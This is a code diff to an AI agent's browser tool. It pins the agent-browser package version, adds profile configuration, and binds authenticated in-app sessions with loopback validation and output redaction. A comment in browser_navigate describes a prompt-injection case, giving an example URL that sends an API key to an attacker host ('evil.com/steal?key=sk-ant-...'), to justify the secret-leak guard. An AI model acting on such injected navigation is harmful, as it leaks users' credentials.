@@ -61,12 +61,18 @@ import sys
 import tempfile
 import threading
 import time
+import uuid
 import requests
 from typing import Dict, Any, Optional, List, Tuple, Union
 from pathlib import Path
 from agent.auxiliary_client import call_llm
 from agent.redact import redact_cdp_url
-from hermes_constants import agent_browser_runnable, get_hermes_home
+from hermes_constants import (
+    AGENT_BROWSER_NPX_FALLBACK,
+    AGENT_BROWSER_PACKAGE,
+    agent_browser_runnable,
+    get_hermes_home,
+)
 from utils import env_int, is_truthy_value
 from hermes_cli.config import DEFAULT_CONFIG, cfg_get
 from hermes_cli._subprocess_compat import windows_hide_flags
@@ -365,7 +371,7 @@ def _format_browser_timeout_error(
         hints.append(
             "Chromium sandbox launch failed. Set AGENT_BROWSER_ARGS="
             "'--no-sandbox,--disable-dev-shm-usage' in your environment, "
-            "or run: npx agent-browser install --with-deps"
+            "or run: npx -y agent-browser@0.32.0 install --with-deps"
         )
     elif command == "open" and _is_local_mode():
         if _running_in_docker():
@@ -378,7 +384,7 @@ def _format_browser_timeout_error(
             hints.append(
                 "The browser daemon may still be starting, or Chromium may be "
                 "missing system libraries. Install/repair with: "
-                "npx agent-browser install --with-deps "
+                "npx -y agent-browser@0.32.0 install --with-deps "
                 "(or: npx playwright install --with-deps chromium)"
             )
     if hints:
@@ -617,6 +623,8 @@ _agent_browser_resolved = False
 # agent-browser v0.25.3+ supports ``--engine lightpanda`` natively.
 _cached_browser_engine: Optional[str] = None
 _browser_engine_resolved = False
+_cached_agent_browser_profile: Optional[str] = None
+_agent_browser_profile_resolved = False
 
 
 def _is_legacy_provider_registry_overridden() -> bool:
@@ -772,12 +780,23 @@ from hermes_constants import is_termux as _is_termux_environment
 
 def _browser_install_hint() -> str:
     if _is_termux_environment():
-        return "npm install -g agent-browser && agent-browser install"
-    return "npm install -g agent-browser && agent-browser install --with-deps"
+        return f"npm install -g {AGENT_BROWSER_PACKAGE} && agent-browser install"
+    return f"npm install -g {AGENT_BROWSER_PACKAGE} && agent-browser install --with-deps"
 
 
 def _requires_real_termux_browser_install(browser_cmd: str) -> bool:
-    return _is_termux_environment() and _is_local_mode() and browser_cmd.strip() == "npx agent-browser"
+    return (
+        _is_termux_environment()
+        and _is_local_mode()
+        and browser_cmd.strip() == AGENT_BROWSER_NPX_FALLBACK
+    )
+
+
+def _agent_browser_command_prefix(browser_cmd: str) -> list[str]:
+    """Expand only Hermes's exact synthetic npx selector into argv."""
+    if browser_cmd == AGENT_BROWSER_NPX_FALLBACK:
+        return [shutil.which("npx") or "npx", "-y", AGENT_BROWSER_PACKAGE]
+    return [browser_cmd]
 
 
 def _termux_browser_install_error() -> str:
@@ -883,6 +902,27 @@ def _get_browser_engine() -> str:
         _cached_browser_engine = "auto"
 
     return _cached_browser_engine
+
+
+def _get_agent_browser_profile() -> Optional[str]:
+    """Resolve the persistent Chrome profile name, with config precedence."""
+    global _cached_agent_browser_profile, _agent_browser_profile_resolved
+    if _agent_browser_profile_resolved:
+        return _cached_agent_browser_profile
+    _agent_browser_profile_resolved = True
+    value = ""
+    try:
+        from hermes_cli.config import read_raw_config
+
+        browser_cfg = read_raw_config().get("browser", {})
+        if isinstance(browser_cfg, dict):
+            value = str(browser_cfg.get("agent_browser_profile") or "").strip()
+    except Exception:
+        value = ""
+    if not value:
+        value = os.environ.get("AGENT_BROWSER_PROFILE", "").strip()
+    _cached_agent_browser_profile = value or None
+    return _cached_agent_browser_profile
 
 
 _cached_headed_mode: Optional[bool] = None
@@ -1076,7 +1116,7 @@ def _run_chrome_fallback_command(
         else:
             hint = (
                 "Chrome fallback requires Chromium, but it is missing. Install it with: "
-                "npx agent-browser install --with-deps "
+                "npx -y agent-browser@0.32.0 install --with-deps "
                 "(or: npx playwright install --with-deps chromium)"
             )
         return {"success": False, "error": hint}
@@ -1086,11 +1126,7 @@ def _run_chrome_fallback_command(
     # returns the plain executable on POSIX.  If npx isn't on PATH (Termux,
     # bare container), fall back to the bare name and let Popen raise with
     # a readable "FileNotFoundError: 'npx'" rather than WinError 193.
-    if browser_cmd == "npx agent-browser":
-        _npx_bin = shutil.which("npx") or "npx"
-        cmd_prefix = [_npx_bin, "agent-browser"]
-    else:
-        cmd_prefix = [browser_cmd]
+    cmd_prefix = _agent_browser_command_prefix(browser_cmd)
     base_args = cmd_prefix + ["--engine", "chrome", "--session", tmp_session, "--json"]
 
     task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{tmp_session}")
@@ -1433,8 +1469,10 @@ def _socket_safe_tmpdir() -> str:
 # Both forms flow through the same _active_sessions / _run_browser_command /
 # cleanup_browser code paths — the key is opaque to those internals.
 #
-# Stores: session_name (always), bb_session_id + cdp_url (cloud mode only)
-_active_sessions: Dict[str, Dict[str, Any]] = {}  # session_key -> {session_name, ...}
+# Stores: session_name (always), bb_session_id + cdp_url (cloud mode only).
+# The tiny state module keeps live ownership coherent across config-sensitive
+# browser_tool reloads.
+from tools.browser_session_state import ACTIVE_SESSIONS as _active_sessions
 _recording_sessions: set = set()  # session_keys with active recordings
 
 # Tracks the most recent session_key used per task_id. Set by browser_navigate()
@@ -1444,6 +1482,394 @@ _recording_sessions: set = set()  # session_keys with active recordings
 # sidecar would fall back to the cloud session on its next snapshot call.
 _last_active_session_key: Dict[str, str] = {}  # task_id -> session_key
 _LOCAL_SUFFIX = "::local"
+
+
+def authenticated_browser_scope_for_session(session_key: str):
+    """Return the complete immutable ABP scope for one in-app document."""
+
+    session_info = _active_sessions.get(session_key)
+    if not isinstance(session_info, dict):
+        return None
+    features = session_info.get("features")
+    if not isinstance(features, dict) or features.get("in_app") is not True:
+        return None
+    try:
+        from tools.authenticated_browser_projection import AuthenticatedBrowserScope
+
+        return AuthenticatedBrowserScope(
+            profile=session_info["profile"],
+            connection_id=session_info["connection_id"],
+            capability_generation=session_info["capability_generation"],
+            tab_id=session_info["tab_id"],
+            binding_generation=session_info["binding_generation"],
+            document_generation=session_info["document_generation"],
+            task_id=session_info.get("owner_task_id") or _bare_task_id_for_session_key(session_key),
+            guest_generation=session_info["guest_generation"],
+            task_generation=session_info["task_generation"],
+        )
+    except (KeyError, TypeError, ValueError):
+        # Missing authenticated identity is a denial, never a reason to use the
+        # ordinary browser redactor for an authenticated partition.
+        return None
+
+
+def authenticated_browser_scope_for_task(task_id: str):
+    return authenticated_browser_scope_for_session(_last_session_key(task_id))
+
+
+def _is_in_app_session(session_key: str) -> bool:
+    session_info = _active_sessions.get(session_key)
+    return (
+        isinstance(session_info, dict)
+        and isinstance(session_info.get("features"), dict)
+        and session_info["features"].get("in_app") is True
+    )
+
+
+def _require_authenticated_browser_scope(session_key: str):
+    scope = authenticated_browser_scope_for_session(session_key)
+    if scope is None and _is_in_app_session(session_key):
+        from tools.authenticated_browser_projection import AuthenticatedBrowserProjectionError
+
+        raise AuthenticatedBrowserProjectionError(
+            "AUTHENTICATED_SCOPE_INVALID",
+            "authenticated browser binding identity is unavailable",
+        )
+    return scope
+
+
+def _project_in_app_diagnostic(session_key: str, value: Any, data_class: str) -> str:
+    scope = _require_authenticated_browser_scope(session_key)
+    if scope is None:
+        return str(value)
+    from tools.authenticated_browser_projection import project_diagnostic
+
+    return project_diagnostic(scope, value, data_class)
+
+
+def _project_in_app_snapshot_before_auxiliary(session_key: str, snapshot_text: str) -> str:
+    scope = _require_authenticated_browser_scope(session_key)
+    if scope is None:
+        return snapshot_text
+    from tools.authenticated_browser_projection import project_text
+
+    return project_text(scope, snapshot_text)
+
+
+def _in_app_ref_scope(session_key: str) -> Optional[tuple[str, str, str, int]]:
+    """Return the immutable ref namespace for an in-app relay session only."""
+    session_info = _active_sessions.get(session_key)
+    if not isinstance(session_info, dict):
+        return None
+    features = session_info.get("features")
+    if not isinstance(features, dict) or features.get("in_app") is not True:
+        return None
+
+    owner = session_info.get("owner_task_id") or _bare_task_id_for_session_key(session_key)
+    tab_id = session_info.get("tab_id")
+    guest_generation = session_info.get("guest_generation")
+    task_generation = session_info.get("task_generation")
+    if (
+        not isinstance(owner, str)
+        or not owner
+        or not isinstance(tab_id, str)
+        or not tab_id
+        or not isinstance(guest_generation, str)
+        or not guest_generation
+        or type(task_generation) is not int
+        or task_generation <= 0
+    ):
+        # In-app refs are security state. Missing binding identity is not a
+        # reason to fall back to upstream's recycled namespace.
+        return None
+    return owner, tab_id, guest_generation, task_generation
+
+
+def _rewrite_in_app_snapshot(
+    session_key: str, snapshot_text: str, refs: Dict[str, Any]
+) -> tuple[str, int]:
+    scope = _in_app_ref_scope(session_key)
+    session_info = _active_sessions.get(session_key) or {}
+    features = session_info.get("features") or {}
+    if scope is None:
+        if isinstance(features, dict) and features.get("in_app") is True:
+            raise ValueError("STALE_REF: in-app browser binding identity is unavailable")
+        return snapshot_text, len(refs) if refs else 0
+
+    from tools.in_app_browser_refs import reconcile_snapshot
+
+    refs = _enrich_in_app_snapshot_refs(session_key, refs)
+
+    return reconcile_snapshot(
+        task_id=scope[0], scope=scope, snapshot=snapshot_text, refs=refs
+    )
+
+
+def _ax_value(node: Dict[str, Any], key: str) -> str:
+    raw = node.get(key)
+    if isinstance(raw, dict):
+        raw = raw.get("value")
+    return str(raw or "").strip()
+
+
+def _enrich_in_app_snapshot_refs(
+    session_key: str, refs: Dict[str, Any]
+) -> Dict[str, Any]:
+    """Join weak consumer refs to the exact AX responses captured by the relay."""
+
+    session_info = _active_sessions.get(session_key) or {}
+    provider = session_info.get("_snapshot_identity_provider")
+    if not callable(provider) or not isinstance(refs, dict):
+        return refs
+    captures = provider()
+    if not isinstance(captures, list):
+        raise ValueError("STALE_REF: snapshot identity capture is unavailable")
+
+    candidates: Dict[tuple[str, str], list[tuple[str, str]]] = {}
+    for capture in captures:
+        if not isinstance(capture, dict):
+            continue
+        capture_frame = capture.get("frame_id")
+        frame_id = capture_frame if isinstance(capture_frame, str) and capture_frame else "main"
+        nodes = capture.get("nodes")
+        if not isinstance(nodes, list):
+            continue
+        for node in nodes:
+            if not isinstance(node, dict):
+                continue
+            if node.get("ignored") is True:
+                continue
+            backend = node.get("backendDOMNodeId")
+            if isinstance(backend, bool) or not isinstance(backend, (str, int)):
+                continue
+            role = _ax_value(node, "role").casefold()
+            name = _ax_value(node, "name")
+            if not role:
+                continue
+            node_frame = node.get("frameId")
+            selected_frame = node_frame if isinstance(node_frame, str) and node_frame else frame_id
+            candidates.setdefault((role, name), []).append((selected_frame, str(backend)))
+
+    enriched: Dict[str, Any] = {}
+    offsets: Dict[tuple[str, str], int] = {}
+    for internal, metadata in refs.items():
+        if not isinstance(metadata, dict):
+            raise ValueError("STALE_REF: snapshot reference identity is unavailable")
+        has_backend = any(
+            key in metadata
+            for key in ("backend_node_id", "backendNodeId", "backendDOMNodeId")
+        )
+        has_frame = any(key in metadata for key in ("frame_id", "frameId", "frame"))
+        if has_backend and has_frame:
+            enriched[internal] = metadata
+            continue
+        key = (str(metadata.get("role") or "").strip().casefold(), str(metadata.get("name") or "").strip())
+        rows = candidates.get(key) or []
+        offset = offsets.get(key, 0)
+        if offset >= len(rows):
+            raise ValueError("STALE_REF: snapshot reference identity is unavailable")
+        offsets[key] = offset + 1
+        frame_id, backend_id = rows[offset]
+        enriched[internal] = {
+            **metadata,
+            "frame_id": frame_id,
+            "backend_node_id": backend_id,
+        }
+    return enriched
+
+
+def _prepare_in_app_snapshot(session_key: str) -> None:
+    """Discard captures from unrelated prior CDP activity before a snapshot."""
+
+    session_info = _active_sessions.get(session_key) or {}
+    provider = session_info.get("_snapshot_identity_provider")
+    if callable(provider):
+        provider()
+
+
+def _translate_in_app_ref(session_key: str, external_ref: str) -> str:
+    scope = _in_app_ref_scope(session_key)
+    session_info = _active_sessions.get(session_key) or {}
+    features = session_info.get("features") or {}
+    if scope is None:
+        if isinstance(features, dict) and features.get("in_app") is True:
+            raise ValueError("STALE_REF: in-app browser binding identity is unavailable")
+        return external_ref
+
+    from tools.in_app_browser_refs import translate_ref
+
+    return translate_ref(scope=scope, external_ref=external_ref)
+
+
+def _invalidate_in_app_refs(session_key: str) -> None:
+    abp_scope = authenticated_browser_scope_for_session(session_key)
+    scope = _in_app_ref_scope(session_key)
+    if scope is not None:
+        from tools.in_app_browser_refs import invalidate_scope
+
+        invalidate_scope(scope)
+    if abp_scope is not None:
+        from tools.authenticated_browser_projection import invalidate_scope as invalidate_abp_scope
+
+        invalidate_abp_scope(abp_scope)
+        session_info = _active_sessions.get(session_key)
+        if isinstance(session_info, dict):
+            session_info["document_generation"] = int(
+                session_info.get("document_generation", 0)
+            ) + 1
+
+
+def invalidate_in_app_browser_session_refs(
+    *, task_id: str, guest_generation: str, task_generation: int
+) -> bool:
+    """Tombstone refs only for the exact binding that observed a top commit."""
+
+    with _cleanup_lock:
+        session_info = _active_sessions.get(task_id)
+        if (
+            not isinstance(session_info, dict)
+            or (session_info.get("features") or {}).get("in_app") is not True
+            or session_info.get("guest_generation") != guest_generation
+            or session_info.get("task_generation") != task_generation
+        ):
+            return False
+        _invalidate_in_app_refs(task_id)
+        return True
+
+
+class InAppBrowserSessionConflict(ValueError):
+    """A predecessor incarnation still owns this task's adapter slot."""
+
+
+def register_in_app_browser_session(
+    *,
+    task_id: str,
+    cdp_url: str,
+    raw_cdp_url: str,
+    profile: str,
+    connection_id: str,
+    capability_generation: int,
+    tab_id: str,
+    binding_generation: int,
+    guest_generation: str,
+    task_generation: int,
+    snapshot_identity_provider=None,
+) -> Dict[str, Any]:
+    """Bind the existing twelve-tool adapter to one authenticated relay URL.
+
+    This is the sole production entry point from ``BrowserTransportManager``.
+    It changes no model-visible schema and stores the immutable tab/generation
+    identity required by stable external refs.
+    """
+    from urllib.parse import urlsplit
+
+    if not isinstance(task_id, str) or not task_id or len(task_id) > 256:
+        raise ValueError("in-app browser task id is invalid")
+    if not isinstance(profile, str) or not profile or len(profile) > 256:
+        raise ValueError("in-app browser profile is invalid")
+    if not isinstance(connection_id, str) or not connection_id or len(connection_id) > 512:
+        raise ValueError("in-app browser connection id is invalid")
+    if type(capability_generation) is not int or capability_generation <= 0:
+        raise ValueError("in-app browser capability generation is invalid")
+    if not isinstance(tab_id, str) or not tab_id or len(tab_id) > 256:
+        raise ValueError("in-app browser tab id is invalid")
+    if not isinstance(guest_generation, str) or not guest_generation or len(guest_generation) > 256:
+        raise ValueError("in-app browser guest generation is invalid")
+    if type(task_generation) is not int or task_generation <= 0:
+        raise ValueError("in-app browser task generation is invalid")
+    if type(binding_generation) is not int or binding_generation <= 0:
+        raise ValueError("in-app browser binding generation is invalid")
+    def validate_relay_url(value: str) -> None:
+        try:
+            parsed = urlsplit(value)
+            port = parsed.port
+        except (TypeError, ValueError) as exc:
+            raise ValueError("in-app browser relay URL is invalid") from exc
+        if (
+            parsed.scheme != "ws"
+            or parsed.hostname != "127.0.0.1"
+            or port is None
+            or not parsed.path.removeprefix("/")
+            or parsed.username is not None
+            or parsed.password is not None
+            or parsed.query
+            or parsed.fragment
+        ):
+            raise ValueError("in-app browser relay must be a token-authenticated loopback URL")
+
+    validate_relay_url(cdp_url)
+    validate_relay_url(raw_cdp_url)
+    if snapshot_identity_provider is not None and not callable(snapshot_identity_provider):
+        raise ValueError("in-app browser snapshot identity provider is invalid")
+
+    with _in_app_session_condition:
+        if task_id in _active_sessions:
+            raise InAppBrowserSessionConflict("browser task already has an active session")
+        session_info: Dict[str, Any] = {
+            "session_name": f"hermes-in-app-{uuid.uuid4().hex[:16]}",
+            "bb_session_id": None,
+            "cdp_url": cdp_url,
+            "raw_cdp_url": raw_cdp_url,
+            "owner_task_id": task_id,
+            "profile": profile,
+            "connection_id": connection_id,
+            "capability_generation": capability_generation,
+            "tab_id": tab_id,
+            "binding_generation": binding_generation,
+            "document_generation": 1,
+            "guest_generation": guest_generation,
+            "task_generation": task_generation,
+            "features": {"cdp_override": True, "in_app": True},
+            "_first_nav": False,
+            "_snapshot_identity_provider": snapshot_identity_provider,
+        }
+        _active_sessions[task_id] = session_info
+        _session_last_activity[task_id] = time.time()
+        _last_active_session_key[task_id] = task_id
+        _in_app_session_expectations.pop(task_id, None)
+        _in_app_session_condition.notify_all()
+        return dict(session_info)
+
+
+def resolve_in_app_browser_cdp_url(task_id: str) -> str:
+    """Return one task's dedicated raw-role endpoint, never its automation URL."""
+
+    with _cleanup_lock:
+        session_key = _last_active_session_key.get(task_id, task_id)
+        session_info = _active_sessions.get(session_key)
+        if (
+            not isinstance(session_info, dict)
+            or (session_info.get("features") or {}).get("in_app") is not True
+        ):
+            return ""
+        value = session_info.get("raw_cdp_url")
+        return value if isinstance(value, str) else ""
+
+
+def unregister_in_app_browser_session(
+    *, task_id: str, guest_generation: str, task_generation: int
+) -> bool:
+    """Retire one exact in-app binding without touching another generation."""
+    with _cleanup_lock:
+        session_info = _active_sessions.get(task_id)
+        if (
+            not isinstance(session_info, dict)
+            or (session_info.get("features") or {}).get("in_app") is not True
+            or session_info.get("guest_generation") != guest_generation
+            or session_info.get("task_generation") != task_generation
+        ):
+            return False
+        _active_sessions.pop(task_id, None)
+        _session_last_activity.pop(task_id, None)
+        _last_active_session_key.pop(task_id, None)
+
+    _stop_cdp_supervisor(task_id)
+    from tools.in_app_browser_refs import retire_task
+    from tools.authenticated_browser_projection import retire_task as retire_abp_task
+
+    retire_task(task_id)
+    retire_abp_task(task_id)
+    return True
 
 # Flag to track if cleanup has been done
 _cleanup_done = False
@@ -1475,6 +1901,13 @@ def _get_session_inactivity_timeout() -> int:
 
 BROWSER_SESSION_INACTIVITY_TIMEOUT = _get_session_inactivity_timeout()
 
+# A Desktop renderer announces a browser-tool demand synchronously from the
+# trusted tool-start callback, before tool dispatch. The tool thread waits on
+# this condition for the exact in-app relay rather than racing into the ordinary
+# local/cloud backend and permanently occupying the task id.
+_IN_APP_BIND_TIMEOUT_SECONDS = 10.0
+_in_app_session_expectations: Dict[str, float] = {}
+
 # Track last activity time per session
 _session_last_activity: Dict[str, float] = {}
 
@@ -1484,6 +1917,19 @@ _cleanup_running = False
 # Protects _session_last_activity AND _active_sessions for thread safety
 # (subagents run concurrently via ThreadPoolExecutor)
 _cleanup_lock = threading.Lock()
+_in_app_session_condition = threading.Condition(_cleanup_lock)
+
+
+def expect_in_app_browser_session(task_id: str, timeout: float = _IN_APP_BIND_TIMEOUT_SECONDS) -> None:
+    """Require the next browser access for ``task_id`` to use Desktop's relay."""
+    if not isinstance(task_id, str) or not task_id or len(task_id) > 256:
+        raise ValueError("in-app browser task id is invalid")
+    if not isinstance(timeout, (int, float)) or isinstance(timeout, bool) or timeout <= 0:
+        raise ValueError("in-app browser bind timeout is invalid")
+
+    with _in_app_session_condition:
+        _in_app_session_expectations[task_id] = time.monotonic() + float(timeout)
+        _in_app_session_condition.notify_all()
 
 
 def _emergency_cleanup_all_sessions():
@@ -2067,10 +2513,36 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
     # Update activity timestamp for this session
     _update_session_activity(task_id)
 
-    with _cleanup_lock:
-        # Check if we already have a session for this task
+    with _in_app_session_condition:
+        # Check if we already have a session for this task. A newly armed
+        # Desktop expectation may not inherit an ordinary backend created by an
+        # earlier surface or stale path.
         if task_id in _active_sessions:
-            return _active_sessions[task_id]
+            existing = _active_sessions[task_id]
+            expectation = _in_app_session_expectations.get(task_id)
+            features = existing.get("features") if isinstance(existing, dict) else None
+
+            if expectation is not None and not (isinstance(features, dict) and features.get("in_app") is True):
+                _in_app_session_expectations.pop(task_id, None)
+                raise RuntimeError("trusted in-app browser demand conflicts with an ordinary active backend")
+
+            return existing
+
+        deadline = _in_app_session_expectations.get(task_id)
+
+        while deadline is not None:
+            remaining = deadline - time.monotonic()
+
+            if remaining <= 0:
+                _in_app_session_expectations.pop(task_id, None)
+                raise RuntimeError("in-app browser relay did not bind before the trusted deadline")
+
+            _in_app_session_condition.wait(timeout=remaining)
+
+            if task_id in _active_sessions:
+                return _active_sessions[task_id]
+
+            deadline = _in_app_session_expectations.get(task_id)
 
     # Hybrid routing: session keys ending with ``::local`` force a local
     # Chromium regardless of the globally-configured cloud provider.  Public
@@ -2147,7 +2619,7 @@ def _agent_browser_candidate_present(path: str | None) -> bool:
     if not path:
         return False
     if " " in path and path.split()[0].endswith("npx"):
-        return True
+        return path == AGENT_BROWSER_NPX_FALLBACK
     return os.path.exists(path) and (os.name == "nt" or os.access(path, os.X_OK))
 
 
@@ -2155,8 +2627,8 @@ def _find_agent_browser(*, validate: bool = True) -> str:
     """
     Find the agent-browser CLI executable.
 
-    Checks in order: current PATH, Homebrew/common bin dirs, Hermes-managed
-    node, local node_modules/.bin/, npx fallback.
+    Checks installed exact candidates first, then invokes Hermes's exact lazy
+    installer, and only then retains an exact-version npx fallback.
 
     Returns:
         Path to agent-browser executable
@@ -2171,7 +2643,7 @@ def _find_agent_browser(*, validate: bool = True) -> str:
                 "agent-browser CLI not found (cached). Install it with: "
                 f"{_browser_install_hint()}\n"
                 "Or run 'npm install' in the repo root to install locally.\n"
-                "Or ensure npx is available in your PATH."
+                f"Or run '{AGENT_BROWSER_NPX_FALLBACK} --version'."
             )
         return _cached_agent_browser
 
@@ -2234,18 +2706,13 @@ def _find_agent_browser(*, validate: bool = True) -> str:
             _agent_browser_resolved = True
             return _cached_agent_browser
 
-    # Check common npx locations (also search the extended fallback PATH)
+    # Locate npx now, but do not accept it before the exact Hermes installer.
     npx_path = shutil.which("npx")
     if not npx_path and extended_path:
         npx_path = shutil.which("npx", path=extended_path)
-    if npx_path:
-        if not validate:
-            return "npx agent-browser"
-        _cached_agent_browser = "npx agent-browser"
-        _agent_browser_resolved = True
-        return _cached_agent_browser
-
     if not validate:
+        if npx_path:
+            return AGENT_BROWSER_NPX_FALLBACK
         raise FileNotFoundError("agent-browser CLI not found")
 
     # Nothing found — try lazy installation before giving up.
@@ -2267,12 +2734,19 @@ def _find_agent_browser(*, validate: bool = True) -> str:
     except Exception:
         pass
 
+    # Last resort remains exact. `-y` makes a clean-cache run noninteractive;
+    # the package selector prevents compatible-downgrade/current-latest drift.
+    if npx_path:
+        _cached_agent_browser = AGENT_BROWSER_NPX_FALLBACK
+        _agent_browser_resolved = True
+        return _cached_agent_browser
+
     _agent_browser_resolved = True
     raise FileNotFoundError(
         "agent-browser CLI not found. Install it with: "
         f"{_browser_install_hint()}\n"
         "Or run 'npm install' in the repo root to install locally.\n"
-        "Or ensure npx is available in your PATH."
+        f"Or run '{AGENT_BROWSER_NPX_FALLBACK} --version'."
     )
 
 
@@ -2354,7 +2828,7 @@ def _run_browser_command(
         else:
             hint = (
                 "Chromium browser is missing. Install it with: "
-                "npx agent-browser install --with-deps "
+                "npx -y agent-browser@0.32.0 install --with-deps "
                 "(or: npx playwright install --with-deps chromium)"
             )
         logger.warning("browser command blocked: %s", hint)
@@ -2370,6 +2844,13 @@ def _run_browser_command(
     except Exception as e:
         logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
         return {"success": False, "error": f"Failed to create browser session: {str(e)}"}
+    try:
+        _require_authenticated_browser_scope(task_id)
+    except Exception as exc:
+        return {
+            "success": False,
+            "error": getattr(exc, "code", "AUTHENTICATED_SCOPE_INVALID"),
+        }
 
     # Build the command with the appropriate backend flag.
     # Cloud mode: --cdp <websocket_url> connects to Browserbase.
@@ -2397,13 +2878,13 @@ def _run_browser_command(
     # Keep concrete executable paths intact, even when they contain spaces.
     # Only the synthetic npx fallback needs to expand into multiple argv items.
     # shutil.which resolves npx → npx.cmd on Windows; bare "npx" stays on POSIX.
-    if browser_cmd == "npx agent-browser":
-        _npx_bin = shutil.which("npx") or "npx"
-        cmd_prefix = [_npx_bin, "agent-browser"]
-    else:
-        cmd_prefix = [browser_cmd]
+    cmd_prefix = _agent_browser_command_prefix(browser_cmd)
 
-    cmd_parts = cmd_prefix + backend_args + [
+    profile_args: List[str] = []
+    if not session_info.get("cdp_url") and (profile := _get_agent_browser_profile()):
+        profile_args = ["--profile", profile]
+
+    cmd_parts = cmd_prefix + profile_args + backend_args + [
         "--json",
         command
     ] + args
@@ -2505,17 +2986,21 @@ def _run_browser_command(
             proc.wait()
             stdout, stderr = _read_command_output_files(stdout_path, stderr_path)
             _unlink_command_output_files(stdout_path, stderr_path)
+            safe_stdout = _project_in_app_diagnostic(task_id, stdout, "BROWSER_STDOUT")
+            safe_stderr = _project_in_app_diagnostic(task_id, stderr, "BROWSER_STDERR")
             if stderr and stderr.strip():
                 logger.warning(
                     "browser '%s' stderr after timeout: %s",
                     command,
-                    stderr.strip()[:500],
+                    safe_stderr[:500],
                 )
             logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
                            command, timeout, task_id, task_socket_dir)
             result = {
                 "success": False,
-                "error": _format_browser_timeout_error(command, timeout, stdout, stderr),
+                "error": _format_browser_timeout_error(
+                    command, timeout, safe_stdout, safe_stderr
+                ),
             }
             # Fall through to fallback check below
         else:
@@ -2535,7 +3020,12 @@ def _run_browser_command(
             # Log stderr for diagnostics — use warning level on failure so it's visible
             if stderr and stderr.strip():
                 level = logging.WARNING if returncode != 0 else logging.DEBUG
-                logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])
+                logger.log(
+                    level,
+                    "browser '%s' stderr: %s",
+                    command,
+                    _project_in_app_diagnostic(task_id, stderr, "BROWSER_STDERR")[:500],
+                )
 
             stdout_text = stdout.strip()
 
@@ -2558,8 +3048,11 @@ def _run_browser_command(
                     result = parsed
                 except json.JSONDecodeError:
                     raw = stdout_text[:2000]
+                    safe_raw = _project_in_app_diagnostic(
+                        task_id, raw, "BROWSER_MALFORMED_OUTPUT"
+                    )
                     logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
-                                   command, returncode, raw[:500])
+                                   command, returncode, safe_raw[:500])
 
                     if command == "screenshot":
                         stderr_text = (stderr or "").strip()
@@ -2577,30 +3070,36 @@ def _run_browser_command(
                                 "success": True,
                                 "data": {
                                     "path": recovered_path,
-                                    "raw": raw,
+                                    "raw": safe_raw,
                                 },
                             }
                         else:
                             result = {
                                 "success": False,
-                                "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
+                                "error": f"Non-JSON output from agent-browser for '{command}': {safe_raw}"
                             }
                     else:
                         result = {
                             "success": False,
-                            "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
+                            "error": f"Non-JSON output from agent-browser for '{command}': {safe_raw}"
                         }
             elif returncode != 0:
                 # Check for errors
                 error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
-                logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
-                result = {"success": False, "error": error_msg}
+                safe_error = _project_in_app_diagnostic(
+                    task_id, error_msg, "BROWSER_COMMAND_ERROR"
+                )
+                logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, safe_error[:300])
+                result = {"success": False, "error": safe_error}
             else:
                 result = {"success": True, "data": {}}
 
     except Exception as e:
-        logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
-        result = {"success": False, "error": str(e)}
+        safe_exception = _project_in_app_diagnostic(
+            task_id, str(e), "BROWSER_COMMAND_EXCEPTION"
+        )
+        logger.warning("browser '%s' exception: %s", command, safe_exception)
+        result = {"success": False, "error": safe_exception}
 
     # --- Lightpanda automatic Chrome fallback ---
     # If engine is lightpanda and the result looks broken, retry with Chrome.
@@ -2813,6 +3312,32 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    effective_task_id = task_id or "default"
+    initial_session_key = _last_session_key(effective_task_id)
+    try:
+        authenticated_scope = _require_authenticated_browser_scope(initial_session_key)
+    except Exception as exc:
+        code = getattr(exc, "code", "AUTHENTICATED_SCOPE_INVALID")
+        return json.dumps({"success": False, "error": code}, ensure_ascii=False)
+    if authenticated_scope is not None:
+        from tools.authenticated_browser_projection import (
+            AuthenticatedBrowserProjectionError,
+            contains_url_reference,
+            resolve_url_reference,
+        )
+
+        if isinstance(url, str) and url.startswith("@url"):
+            try:
+                url = resolve_url_reference(authenticated_scope, url)
+            except AuthenticatedBrowserProjectionError as exc:
+                return json.dumps(exc.payload(), ensure_ascii=False)
+        elif contains_url_reference(url):
+            return json.dumps({
+                "success": False,
+                "error": "URL_REFERENCE_INVALID",
+                "message": "URL references are accepted only as the complete navigation argument",
+            }, ensure_ascii=False)
+
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
@@ -2843,7 +3368,6 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
     # cloud provider never sees the URL in that case.  Can also be opted
     # out globally via ``browser.allow_private_urls`` in config.
-    effective_task_id = task_id or "default"
     nav_session_key = _navigation_session_key(effective_task_id, url)
     auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
 
@@ -2918,6 +3442,10 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         session_info["_first_nav"] = False
         _maybe_start_recording(nav_session_key)
 
+    # A top-level navigation invalidates every prior document ref before any
+    # side effect can occur.  A failed/ambiguous open must not leave old refs
+    # actionable against whatever document ultimately committed.
+    _invalidate_in_app_refs(nav_session_key)
     result = _run_browser_command(
         nav_session_key,
         "open",
@@ -3006,19 +3534,28 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         # Auto-take a compact snapshot so the model can act immediately
         # without a separate browser_snapshot call.
         try:
+            _prepare_in_app_snapshot(nav_session_key)
             snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
             if snap_result.get("success"):
                 snap_data = snap_result.get("data", {})
                 snapshot_text = snap_data.get("snapshot", "")
                 refs = snap_data.get("refs", {})
